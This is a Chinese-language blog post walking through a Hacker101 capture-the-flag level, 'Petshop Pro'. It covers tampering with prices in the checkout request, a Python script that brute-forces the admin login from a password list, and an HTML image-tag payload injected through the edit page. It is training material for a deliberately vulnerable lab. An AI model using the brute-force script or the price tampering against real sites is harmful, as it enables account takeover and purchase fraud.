---
title: "hacker101 第9关&&第10关"
date: 2019-12-01T11:37:09+08:00
showDate: true
draft: false
tags: ["security","hacker101", "ctf"]
categories: ["security"]
---

## 第9关 Petshop Pro

进去逛一逛，看起来是一个买宠物照片的网站？

目测能访问的路径有:

```

GET /
GET /add/0
GET /add/1
GET /cart
POST /checkout  data="cart=xxx"
```

### flag1

试了下`GET /add/0'`,NOT FOUND，没有注入点。

能输入的地方看起来就只有POST那里，burpsuite那里看了下数据格式

![9-1](./9-1.png)

应该是常规的url encode，解码看一下。

![9-2](./9-2.png)

传这么多数据干嘛？试试少几个字段会怎样，发现只有name和price是可用的，而且返回的结果和这个有关。
尝试把price都改成0。第一个flag就出来了。

![9-3](./9-3.png)

### flag2

剩下几个api也没找到什么问题，后来看了下hint。`There must be a way to administer the app`，这是在让我尝试找登录点嘛。

于是我试了下`/login`，果然有登录界面

![9-4](./9-4.png)

试了下注入，弱密码，都没有成功。再看了下hint。`Tools may help you find the entrypoint`，是要工具爆破嘛？

但是因为自己的burpsuite是社区版，爆破只能一个线程，那还不如手动写呢。

```python

# coding: utf-8
import requests
import re

def login(username, password):
    url = "http://34.94.3.143/236507f627/login"
    data = {
        "username": username,
        "password": password
    }
    r = requests.post(url, data=data)
    text = r.text
    if re.search('Invalid username', text):
        return "{} error".format(username), False
    elif re.search('Invalid password', text):
        return "{} error".format(password), False
    else:
        return username, password


if __name__ == '__main__':
    with open("password.txt") as f:
        for line in f:
            username = "rubina" # line.strip()
            password = line.strip()
            res = login(username, password)
            print(res)
            if res[1]:
                break
```

字典从github下载就行了。

这个也是单线程，但是将就能用~先跑username，睡个午觉起来发现跑出来了`username=rubina`

最后碍于效率，还是装了个专业版的burp，开100个线程太爽了。

最后跑出了结果`password=public`

![9-5](./9-5.png)

登录后第二个flag也有了。

![9-6](./9-6.png)

### flag3

登陆之后多了一个`/edit?id=0`页面，分别试了一下xss和注入，都没出flag。
各种尝试无果，
看了下hint，`Bugs don't always appear in a place where the data is entered`。有点像csrf哦。

构造payload`<img src="http://xxx/add/2">`，然后访问`http://xxx/cart`，get it~


![9-7](./9-7.png)


## 第10关 Model E1337 - Rolling Code Lock


暂时跳过